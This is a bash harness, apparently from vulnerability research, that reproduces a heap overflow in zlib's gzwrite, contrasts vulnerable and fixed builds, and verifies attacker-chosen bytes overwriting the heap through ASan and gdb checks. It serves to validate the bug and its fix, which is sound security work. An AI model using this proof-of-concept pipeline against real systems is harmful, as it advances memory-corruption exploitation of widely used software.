#!/usr/bin/env bash
# zlib2shell — verbatim-pinned harness for CVE-2026-85091 (stale gzwrite pointer).
# Every run re-checks pin hashes, dry-runs the upstream fix hunk, rebuilds
# vulnerable/fixed x plain/ASan from the pinned 1.3.2 tarball with gzwrite.c
# swapped for the pinned parent/fix blobs, and checks the rung ladder.
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$HERE")"
SRC="$ROOT/src"
OUT="$HERE/evidence"
mkdir -p "$OUT"
TMP="$(mktemp -d /tmp/zlib2shell.XXXXXX)"
trap 'rm -rf "$TMP"' EXIT
PASS=0; FAIL=0
ck() { if [ "$2" = "1" ]; then echo "PASS $1"; PASS=$((PASS+1)); else echo "FAIL $1"; FAIL=$((FAIL+1)); fi; }
hr() { sha256sum "$1" | awk '{print $1}'; }
g() { grep -E "^$2=" "$1" | head -1 | cut -d= -f2-; }

TARBALL_SHA=bb329a0a2cd0274d05519d61c667c062e06990d72e125ee2dfa8de64f0119d16
PARENT_SHA=9b76b11e1aee82378a234a6f63fa2a40623e32315e4023ab498555ea5428b43c
FIXED_SHA=a3289b4dc38c5470c34b14908c921fdf3dbb0e78c9e344aa0cb3d535d6292c10
PATCH_SHA=110ff14375733173d8aa54574473424fbd7dfe4b81f1ca34a759c6fe14b15b14
DRIVER_SHA=941296b030e0f9f6a904f689aff057ac8174326a83a112f3964cba1a1c99e1cf
ck PIN_TARBALL "$([ "$(hr "$SRC/zlib-1.3.2.tar.gz")" = "$TARBALL_SHA" ] && echo 1 || echo 0)"
if [ ! -f "$SRC/zlib-1.3.2/configure" ]; then
  tar xzf "$SRC/zlib-1.3.2.tar.gz" -C "$SRC"
fi
ck PIN_PARENT "$([ "$(hr "$SRC/gzwrite.c.parent")" = "$PARENT_SHA" ] && echo 1 || echo 0)"
ck PIN_FIXED "$([ "$(hr "$SRC/gzwrite.c.fixed")" = "$FIXED_SHA" ] && echo 1 || echo 0)"
ck PIN_PATCH "$([ "$(hr "$SRC/fix-df84af25.patch")" = "$PATCH_SHA" ] && echo 1 || echo 0)"
ck PIN_DRIVER "$([ "$(hr "$HERE/driver.c")" = "$DRIVER_SHA" ] && echo 1 || echo 0)"

# Verbatim extraction of gz_write() and gz_vacate() from each pinned blob.
extract() { # file start-pattern outfile
  awk -v pat="$2" 'index($0, pat) {p=1} p {print} p && /^\}$/ {exit}' "$1" > "$3"
}
extract "$SRC/gzwrite.c.parent" 'local z_size_t gz_write(gz_statep state' "$TMP/gzwrite-vuln.inc"
extract "$SRC/gzwrite.c.fixed" 'local z_size_t gz_write(gz_statep state' "$TMP/gzwrite-fixed.inc"
extract "$SRC/gzwrite.c.parent" 'local int gz_vacate(gz_statep state)' "$TMP/vacate-vuln.inc"
extract "$SRC/gzwrite.c.fixed" 'local int gz_vacate(gz_statep state)' "$TMP/vacate-fixed.inc"
ck SLICE_GZWRITE_NONEMPTY "$([ -s "$TMP/gzwrite-vuln.inc" ] && [ -s "$TMP/gzwrite-fixed.inc" ] && echo 1 || echo 0)"
ck SLICE_VACATE_NONEMPTY "$([ -s "$TMP/vacate-vuln.inc" ] && [ -s "$TMP/vacate-fixed.inc" ] && echo 1 || echo 0)"
ck SLICE_VULN_NO_RESET "$(grep -q 'strm->avail_in = 0;' "$TMP/gzwrite-vuln.inc" && echo 0 || echo 1)"
ck SLICE_FIXED_RESET "$(grep -q 'state->strm.avail_in = 0;' "$TMP/gzwrite-fixed.inc" && grep -q 'state->strm.next_in = state->in;' "$TMP/gzwrite-fixed.inc" && echo 1 || echo 0)"
ck SLICE_MEMMOVE_BOTH "$(grep -q 'memmove(state->in, strm->next_in, strm->avail_in);' "$TMP/vacate-vuln.inc" && grep -q 'memmove(state->in, strm->next_in, strm->avail_in);' "$TMP/vacate-fixed.inc" && echo 1 || echo 0)"

mkdir -p "$TMP/dry"
cp "$SRC/gzwrite.c.parent" "$TMP/dry/gzwrite.c"
patch -d "$TMP/dry" -p1 --dry-run < "$SRC/fix-df84af25.patch" > "$OUT/fix-dryrun.txt" 2>&1
ck FIX_HUNK_APPLIES "$([ $? -eq 0 ] && echo 1 || echo 0)"

build() { # name blob compiler flags
  local name="$1" blob="$2" cc="$3" flags="$4"
  local dir="$TMP/build-$name"
  mkdir -p "$dir"
  cp -r "$SRC/zlib-1.3.2/." "$dir/"
  cp "$blob" "$dir/gzwrite.c"
  ( cd "$dir" && CC="$cc" CFLAGS="$flags" ./configure --static > "$OUT/build-$name.log" 2>&1 \
    && make -s -j4 >> "$OUT/build-$name.log" 2>&1 \
    && "$cc" $flags -I. "$HERE/driver.c" libz.a -o "$TMP/poc-$name" >> "$OUT/build-$name.log" 2>&1 )
}
ASAN='-fsanitize=address -fno-omit-frame-pointer -g -O0'
build vuln-plain "$SRC/gzwrite.c.parent" gcc '-g -O0'
build fixed-plain "$SRC/gzwrite.c.fixed" gcc '-g -O0'
build vuln-asan "$SRC/gzwrite.c.parent" gcc "$ASAN"
build vuln-asan-clang "$SRC/gzwrite.c.parent" clang "$ASAN"
build fixed-asan "$SRC/gzwrite.c.fixed" gcc "$ASAN"
ck BUILDS "$([ -x "$TMP/poc-vuln-plain" ] && [ -x "$TMP/poc-fixed-plain" ] && [ -x "$TMP/poc-vuln-asan" ] && [ -x "$TMP/poc-vuln-asan-clang" ] && [ -x "$TMP/poc-fixed-asan" ] && echo 1 || echo 0)"

"$TMP/poc-vuln-plain" attack > "$OUT/plain-attack.out" 2>&1
"$TMP/poc-fixed-plain" attack > "$OUT/fixed-attack.out" 2>&1
"$TMP/poc-vuln-plain" safe > "$OUT/plain-safe.out" 2>&1
"$TMP/poc-fixed-plain" safe > "$OUT/fixed-safe.out" 2>&1
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-vuln-asan" attack > "$OUT/vuln-gcc-asan.out" 2>&1; GA_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-vuln-asan-clang" attack > "$OUT/vuln-clang-asan.out" 2>&1; CA_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-fixed-asan" attack > "$OUT/fixed-asan.out" 2>&1; FA_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-vuln-asan" safe > "$OUT/vuln-asan-safe.out" 2>&1; VS_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-fixed-asan" safe > "$OUT/fixed-asan-safe.out" 2>&1; FS_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-vuln-asan" socket > "$OUT/vuln-socket-asan.out" 2>&1; SA_RC=$?
ASAN_OPTIONS=abort_on_error=0 "$TMP/poc-fixed-asan" socket > "$OUT/fixed-socket-asan.out" 2>&1; FS2_RC=$?

# Scoped chosen-byte readback: break after the memmove and read state->in.
gdb -q -batch \
  -ex 'break gzwrite.c:395' -ex 'run chosen' \
  -ex 'print strm->avail_in' \
  -ex 'print/x state->in[0]' -ex 'print/x state->in[17]' -ex 'print/x state->in[16384]' \
  "$TMP/poc-vuln-plain" > "$OUT/gdb-chosen.out" 2>&1
gv() { grep -m1 -E "^[$]$1 = " "$OUT/gdb-chosen.out" | awk '{print $3}'; }
AVAIL="$(gv 1)"; D0="$(gv 2)"; D17="$(gv 3)"; D16384="$(gv 4)"

ck R1_STALL_OBSERVED "$([ "$(g "$OUT/plain-attack.out" WRITTEN)" = 65535 ] && [ "$(g "$OUT/plain-attack.out" WRITE_SIZE)" = 1048576 ] && echo 1 || echo 0)"
ck R1_STALE_AVAIL "$([ "$AVAIL" = 34465 ] && echo 1 || echo 0)"
ck R2_COPY_PAST_REGION "$([ "$AVAIL" -gt 16384 ] 2>/dev/null && echo 1 || echo 0)"
ck R3_GCC_ASAN "$(grep -q 'heap-buffer-overflow' "$OUT/vuln-gcc-asan.out" && grep -q 'WRITE of size 983041' "$OUT/vuln-gcc-asan.out" && grep -q 'gz_vacate' "$OUT/vuln-gcc-asan.out" && grep -q 'located 0 bytes after 16384-byte region' "$OUT/vuln-gcc-asan.out" && echo 1 || echo 0)"
ck R3_CLANG_ASAN "$(grep -q 'heap-buffer-overflow' "$OUT/vuln-clang-asan.out" && grep -q 'WRITE of size 983041' "$OUT/vuln-clang-asan.out" && grep -q 'gz_vacate' "$OUT/vuln-clang-asan.out" && echo 1 || echo 0)"
ck R3_SOCKET_ASAN "$(grep -q 'heap-buffer-overflow' "$OUT/vuln-socket-asan.out" && grep -q 'WRITE of size 983041' "$OUT/vuln-socket-asan.out" && grep -q 'gz_vacate' "$OUT/vuln-socket-asan.out" && echo 1 || echo 0)"
ck R4_GDB_MEMMOVE_HIT "$(grep -q 'Breakpoint 1, gz_vacate' "$OUT/gdb-chosen.out" && echo 1 || echo 0)"
ck R4_CHOSEN_0x5a "$([ "$D0" = 0x5a ] && echo 1 || echo 0)"
ck R4_CHOSEN_0x44 "$([ "$D17" = 0x44 ] && echo 1 || echo 0)"
ck R4_CHOSEN_0xc7 "$([ "$D16384" = 0xc7 ] && echo 1 || echo 0)"
ck R4_SOURCE_MARKERS "$(grep -q 'MODE=chosen' "$OUT/gdb-chosen.out" && grep -q 'SRC0=5a' "$OUT/gdb-chosen.out" && echo 1 || echo 0)"
ck FIXED_ASAN_CLEAN "$([ $FA_RC -eq 0 ] && ! grep -q AddressSanitizer "$OUT/fixed-asan.out" && echo 1 || echo 0)"
ck FIXED_PLAIN_CLEAN "$([ "$(g "$OUT/fixed-attack.out" PRINTF_RC)" = 1 ] && ! grep -q 'munmap_chunk' "$OUT/fixed-attack.out" && echo 1 || echo 0)"
ck SAFE_VULN_ASAN_CLEAN "$([ $VS_RC -eq 0 ] && ! grep -q AddressSanitizer "$OUT/vuln-asan-safe.out" && echo 1 || echo 0)"
ck SAFE_FIXED_ASAN_CLEAN "$([ $FS_RC -eq 0 ] && ! grep -q AddressSanitizer "$OUT/fixed-asan-safe.out" && echo 1 || echo 0)"
ck GCC_ASAN_REPORTED "$([ $GA_RC -ne 0 ] && echo 1 || echo 0)"
ck CLANG_ASAN_REPORTED "$([ $CA_RC -ne 0 ] && echo 1 || echo 0)"
ck SOCKET_FIXED_CLEAN "$([ $SA_RC -ne 0 ] && [ $FS2_RC -eq 0 ] && ! grep -q AddressSanitizer "$OUT/fixed-socket-asan.out" && echo 1 || echo 0)"

# Normalized trace: no PID, address or compiler path; stable across /tmp replay.
cat "$OUT/plain-attack.out" "$OUT/fixed-attack.out" "$OUT/plain-safe.out" \
  "$OUT/vuln-socket-asan.out" "$OUT/fixed-socket-asan.out" \
  | grep -E '^(MODE|WRITE_SIZE|STALL|WRITTEN|SRC0|SRC17|SRC16384|PRINTF_RC|RC|TRACE_END)=' > "$OUT/trace.txt"
printf 'GDB_AVAIL_IN=%s\nGDB_DST0=%s\nGDB_DST17=%s\nGDB_DST16384=%s\n' \
  "$AVAIL" "$D0" "$D17" "$D16384" >> "$OUT/trace.txt"
TRACE_SHA="$(hr "$OUT/trace.txt")"
echo "TRACE_SHA256=$TRACE_SHA"

if [ "${REPLAY:-0}" != 1 ]; then
  R="$(mktemp -d /tmp/zlib2shell-replay.XXXXXX)"
  mkdir -p "$R/src" "$R/harness"
  cp -r "$SRC/." "$R/src/"
  cp "$HERE/run.sh" "$HERE/driver.c" "$R/harness/"
  ( cd "$R" && REPLAY=1 bash harness/run.sh > "$OUT/replay.txt" 2>&1 )
  RT="$(grep '^TRACE_SHA256=' "$OUT/replay.txt" | cut -d= -f2)"
  ck REPLAY_MATCH "$([ "$RT" = "$TRACE_SHA" ] && echo 1 || echo 0)"
  rm -rf "$R"
fi

echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
